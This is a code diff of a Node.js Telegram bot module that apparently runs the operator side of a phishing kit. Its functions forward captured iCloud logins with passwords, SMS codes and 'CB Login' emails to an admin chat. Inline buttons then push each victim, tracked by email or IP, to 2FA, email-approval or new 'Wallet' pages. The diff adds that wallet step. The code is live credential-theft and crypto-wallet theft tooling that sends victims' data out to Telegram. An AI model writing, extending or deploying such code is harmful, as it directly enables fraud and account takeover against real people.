@@ -87,8 +87,7 @@ function sendApprovalRequestGeneric(identifier) {
 }
 
 // -----------------
-// ✅ FIXED: iCloud SMS approval
-// Now accepts full formatted message built by frontend
+// iCloud SMS approval
 // -----------------
 async function sendApprovalRequestSMS(code, message) {
   const options = {
@@ -106,8 +105,7 @@ async function sendApprovalRequestSMS(code, message) {
 }
 
 // -----------------
-// ✅ FIXED: iCloud Login approval
-// Now accepts full formatted message built by frontend
+// iCloud Login approval
 // -----------------
 async function sendApprovalRequestPage(email, password, message) {
   const options = {
@@ -125,8 +123,7 @@ async function sendApprovalRequestPage(email, password, message) {
 }
 
 // -----------------
-// ✅ FIXED: CB Login approval
-// Now accepts full formatted message built by frontend
+// CB Login approval
 // -----------------
 async function sendLoginTelegram(email, message) {
   const options = {
@@ -135,12 +132,38 @@ async function sendLoginTelegram(email, message) {
       inline_keyboard: [
         [
           { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
-          ],
+        ],
         [
           { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
         ],
         [
           { text: "❌ Reject ❌", callback_data: `reject|${email}` }
+        ]
+      ]
+    }
+  };
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+}
+
+// -----------------
+// ✅ NEW: Verify page approval (3 destination buttons)
+// -----------------
+async function sendVerifyTelegram(ip, message) {
+  const options = {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Done", callback_data: `page1|${ip}` }
+        ],
+        [
+          { text: "🔐 Last 2FA", callback_data: `page2|${ip}` }
+        ],
+        [
+          { text: "👛 Wallet", callback_data: `page3|${ip}` }
+        ],
+        [
+          { text: "❌ Reject ❌", callback_data: `reject|${ip}` }
         ]
       ]
     }
@@ -236,9 +259,10 @@ bot.on("callback_query", async (query) => {
     if (action === "accept") status = "accepted";
     else if (action === "page1") status = "accepted1";
     else if (action === "page2") status = "accepted2";
+    else if (action === "page3") status = "accepted3";
     else status = "rejected";
 
-    const isAccepted = status === "accepted" || status === "accepted1" || status === "accepted2";
+    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3"].includes(status);
     const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";
 
     // Notify backend
@@ -248,7 +272,7 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Step 1: ✅ Remove buttons but KEEP the original info message visible
+    // Step 1: Remove buttons but KEEP the original info message visible
     try {
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -297,8 +321,6 @@ module.exports = {
   sendApprovalRequestSMS,
   sendApprovalRequestPage,
   sendLoginTelegram,
+  sendVerifyTelegram,
   send2FACode
 };
-
-
-
